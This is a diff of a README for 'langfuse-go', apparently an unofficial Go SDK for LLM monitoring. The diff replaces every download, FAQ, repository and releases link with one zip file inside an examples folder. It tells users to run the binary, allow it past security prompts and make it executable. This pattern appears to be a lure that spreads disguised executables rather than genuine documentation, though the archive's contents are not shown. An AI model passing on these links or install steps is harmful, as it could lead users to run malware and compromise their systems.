@@ -1,6 +1,6 @@
 # 🎉 langfuse-go - Simplify Monitoring Your LLM Applications
 
-[![Download langfuse-go](https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip)](https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip)
+[![Download langfuse-go](https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip)](https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip)
 
 ## 🚀 Getting Started
 
@@ -8,29 +8,29 @@ Welcome to langfuse-go! This is an unofficial Go SDK that helps you trace, monit
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download langfuse-go](https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip).
+To get started, visit this page to download: [Download langfuse-go](https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip).
 
 Follow these steps to download and set up the software:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of langfuse-go.
 3. Download the file that matches your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip`
-   - For macOS, download `https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip`
-   - For Linux, download `https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip`
+   - For Windows, download `https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip`
+   - For macOS, download `https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip`
+   - For Linux, download `https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip`
 4. Once the download finishes, find the file on your computer.
 5. Follow the instructions for your operating system below.
 
 ### 🖥️ For Windows Users
 
-1. Double-click on `https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip` to run it.
+1. Double-click on `https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip` to run it.
 2. If prompted by security settings, allow the application to run.
 3. Follow the on-screen instructions to complete the setup.
 4. You are now ready to use langfuse-go!
 
 ### 🍏 For macOS Users
 
-1. Open the downloaded file `https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip` to extract its contents.
+1. Open the downloaded file `https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip` to extract its contents.
 2. Find the `langfuse-go` executable in the new folder.
 3. Drag it to your Applications folder.
 4. Open Terminal and type `cd /Applications/` then `./langfuse-go` to run the application.
@@ -38,7 +38,7 @@ Follow these steps to download and set up the software:
 
 ### 🐧 For Linux Users
 
-1. Extract the `https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip` file.
+1. Extract the `https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip` file.
 2. Open your terminal and navigate to the extracted folder.
 3. Type `chmod +x langfuse-go` to make it executable.
 4. Launch the application by typing `./langfuse-go` in the terminal.
@@ -78,7 +78,7 @@ If you encounter issues while installing or using langfuse-go, consider the foll
 - Restart your computer and try running the program again.
 - Check for any available software updates on the Releases page.
 
-You can also consult our [FAQ section](https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip) for more tips.
+You can also consult our [FAQ section](https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip) for more tips.
 
 ## 📜 Community & Support
 
@@ -93,8 +93,8 @@ langfuse-go is released under the MIT License. Feel free to use and modify the s
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip)
-- [Releases Page](https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip)
-- [FAQ Section](https://raw.githubusercontent.com/sedai194443/langfuse-go/master/examples/getting_started/go-langfuse-v3.3.zip)
+- [GitHub Repository](https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip)
+- [Releases Page](https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip)
+- [FAQ Section](https://github.com/sedai194443/langfuse-go/raw/refs/heads/master/examples/async_batch/langfuse-go-hematonic.zip)
 
 Thank you for choosing langfuse-go! We hope it simplifies your LLM application monitoring.
